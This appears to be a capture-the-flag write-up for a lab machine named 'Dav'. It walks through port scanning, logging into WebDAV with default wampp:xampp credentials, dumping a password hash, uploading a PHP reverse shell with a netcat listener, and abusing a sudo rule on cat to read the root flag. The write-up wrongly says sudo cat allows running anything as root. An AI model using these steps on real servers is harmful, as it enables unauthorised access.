<h1>Dav</h1>

<h2>recognize</h2>

1. use **nmap** to find open ports. Here it's **80/tcp open  http**

2. use **feroxbuster** to analyze http service. Found interesting:
 * /Documents%20and%20Settings
 * /Program%20Files
 * /reports%20list
 * /webdav

3. Search information about **webdav** on google, and know that WebDAV, which stands for Web Distributed Authoring and Versioning, is an extension to the HTTP protocol that allows users to collaboratively edit and manage files on a web server as if they were local files.
More research on the same by utilizing AI tools discovered that the default username:password is — wampp:xampp
```
username: wampp
pass: xampp
```

<h2>Gain access to the server</h2>
4. Use it to go in server
```
cadaver http://ip/webdav
```

```
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
        passwd.dav                            44  Aug 26  2019
dav:/webdav/> cat passwd.dav 
wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91
```

Cool, success  **cadaver** it is a console utility for Linux/Unix that works as a client for the WebDAV protocol

<h2>Prepare exploit</h2>
5. Use basic PHP reverse shell. Basically he is here **/usr/share/webshells/php/php-reverse-shell.php**

**Note:** Change loopback IP to your tun0.

On the target machine:
```
dav:/webdav/> put /usr/share/webshells/php/php-reverse-shell.php
```

6. On the your machine prepare netcat:
```
nc -lvnp <your port from php reverse shell>
```

Response:
```
$ pwd
/
$ whoami
www-data
```

<h2>Get flag</h2>
7. On the way **/home/merlin/** we found user.txt
```
cat /home/merlin/user.txt
```

Congrats! It first user flag. Now lets found root.txt

8. Go back to **/** and run:
```
sudo -l
```

As a result we see:
```
$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
```

Nice, **(ALL) NOPASSWD: /bin/cat** that means we can run anything as root by use **/bin/cat**

9. Get final flag:
```
sudo /bin/cat /root/root.txt
```

Congrats! That all from me. Bye :)
